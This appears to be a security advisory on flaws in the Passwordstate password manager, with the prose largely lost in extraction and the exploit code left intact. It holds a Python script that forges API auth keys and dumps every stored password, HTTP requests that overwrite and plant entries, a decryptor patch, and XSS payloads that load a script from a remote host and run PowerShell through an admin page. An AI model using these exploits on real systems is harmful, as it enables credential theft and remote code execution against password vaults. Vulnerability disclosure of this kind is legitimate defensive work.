Passwordstate

Versioning

Disclosure Timeline

Credits

▪
▪
▪

Contents

1 Summary

▪
▪

2 Findings

2.1 Authentication Bypass for API

Summary

Requirements

Details

1

2

3

4

5

6

7

8

9

10

11

12

13

14

15

16

17

18

19

20

21

22

23

24

25

26

27

28

29

30

31

32

33

#!/usr/bin/python3

import requests

import sys

if len(sys.argv) != 3:

    exit(f"Usage: ./{sys.argv[0]} URL USERNAME")

url = sys.argv[1]

user = sys.argv[2]

data_in = user + ";;;"

auth_key = ""

xor_key = "REDACTED"

for i in range(0,len(data_in)):

    a = ord(data_in[i:i+1])

    b = ord(xor_key[(i+1) % len(xor_key)])

    auth_key += "{:02x}".format(a ^ b).upper()

print(f"[+] Generated auth_key for user {user}: {auth_key}")

cookies = {"session-id": auth_key}

data = {"auth_key": auth_key}

response = requests.post(url + "/api/browserextension/getwebsites/", cookies=cookies,

data=data, verify=False)

website_list = response.json()

if response.status_code == 200:

    print(f"[+] Found {len(website_list)} passwords")

    for item in website_list:

        data["PasswordID"] = item["PasswordID"]

        response = requests.post(url + "/api/browserextension/getpassword/",

cookies=cookies, data=data, verify=False)

        item["Password"] = response.json()[0]["Password"]

        print(item)

else:

    print("[-] Could not access API")

2.2 Authorization Bypass Through User-Controlled

Keys

Summary

Requirements

Details

1
2
3
4
5
6
7

POST /api/browserextension/UpdatePassword/ HTTP/1.1
Host: XXX
Cookie: session-id=XXX
Content-Length: 57
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

auth_key=XXX&Password=overwritten&PasswordID=1&PassswordListID=

1
2
3
4
5
6
7

POST /api/browserextension/addpassword/ HTTP/2
Host: XXX
Cookie: session-id=44425C4B0A0A02
Content-Length: 178
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

auth_key=44425C4B0A0A02&PasswordList=x&PasswordListID=1&Title=Fake&UserName=username&D
escription=please+open+me&URL=javascript%3aalert('mod')//&Password=password&WebsiteFav
icon=x

2.3 Failed Protection for Stored Passwords due to

Server-Side Symmetric Encryption

Summary

Requirements

Details

From b18f4ddeee0ebbed5bd9a818c00567594841260e Mon Sep 17 00:00:00 2001

From: mod0

Date: Fri, 12 Aug 2022 14:05:41 +0200

Subject: [PATCH] fixed poc for version 8903 and above

1

2

3

4

5

1 Northwave Red Team, Passwordstate decryptor,
https://github.com/NorthwaveSecurity/passwordstate-decryptor/ [2022-08-18]

6

7

8

9

10

11

12

13

14

15

16

17

---

 PasswordStateDecryptor.ps1 | 6 +++++-

 1 file changed, 5 insertions(+), 1 deletion(-)

diff --git a/PasswordStateDecryptor.ps1 b/PasswordStateDecryptor.ps1

index f6e371a..099216b 100644

--- a/PasswordStateDecryptor.ps1

+++ b/PasswordStateDecryptor.ps1

@@ -140,7 +140,11 @@ function Invoke-PasswordStateDecryptor {

             # Combine secrets and return recovered Text String

             $EncryptionKey =

[Moserware.Security.Cryptography.SecretCombiner]::Combine($Secret1 + "`n" +

$Secret3).RecoveredTextString

18

-            Write-Host -ForegroundColor Green "Recovered Encryption Key:

$EncryptionKey!"

+

+            # For versions >= 8903

+            $EncryptionKey = $EncryptionKey[-1..-$EncryptionKey.Length ] -join ""

+

+            Write-Host -ForegroundColor Green "Recovered Encryption Key:

$EncryptionKey"

         }

         $RawEncryptionKey = Convert-HexStringToByteArray $EncryptionKey

--

2.34.1

19

20

21

22

23

24

25

26

27

28

2.4 Stored Cross-Site Scripting (XSS)

Summary

Requirements

Details

1

javascript:alert('mod0')//

1

javascript:d=window.opener.document;e=d.createElement("script");e.setAttribute("src","

https://REMOTE_HOST/xss-

rce.js");d.body.appendChild(e);window.location.replace("https://example.com")//

1

2

3

4

5

6

7

8

9

10

11

12

13

14

15

16

fetch('/admin/powershellscripts/discovery/testscript.aspx?ScriptID=1')

.then((resp) => resp.text())

.then(function (data) {

var doc = new DOMParser().parseFromString(data, "text/html");

var form = doc.querySelectorAll("form")[0];

var input = document.createElement("input");

input.setAttribute('name', '__ASYNCPOST');

input.setAttribute('value', 'true');

form.append(input);

form.__EVENTTARGET.value='RunScriptButton';

var input3 = document.createElement("input");

input3.setAttribute('name', 'RadScriptManager1');

input3.setAttribute('value', 'RunScriptButtonPanel|RunScriptButton');

form.append(input3);

form.HiddenScript.value="POWERSHELL_COMMANDS"

fetch("/admin/powershellscripts/discovery/testscript.aspx?ScriptID=1",{

method: "POST", body: new URLSearchParams(new FormData(form)) })

17

})

2.5 Use of Hard-coded Emergency Credentials for API

Summary

Requirements

Details

1

2

GET
/api/webcharts/auditingchart/Passwordstate_EmergencyAccess?platform=All%20Platforms&Ac
tivityType=Discovery%20Job%20Permissions%20Removed&Duration=36&SiteID=&ArchivedData=1
HTTP/1.1
Host: XXX

2.6 Insufficiently Protected Credentials for Password

Lists

Summary

Requirements

Details

1

<input name="Password" type="password" maxlength="100" id="Password"
disabled="disabled" class="aspNetDisabled" autocomplete="new-password"
value="secretpasswordlistpassword" style="width:300px;">

2.7 Improper Authorization Allows Attacker-

Controlled Browser Extension Provisioning

Summary

Requirements

Details

1

2
3
4
5
6
7

<input name="PasswordstateBrowserExtensionURL" type="text"
value="http://ATTACKER_CONTROLLED_WEBSITE/TOKEN" id="PasswordstateBrowserExtensionURL"
style="display: none;">
<script>
const myTimeout = setTimeout(myConfirm, 1000);
function myConfirm() {
    document.getElementById("confirm_auth").click()
}
</script>

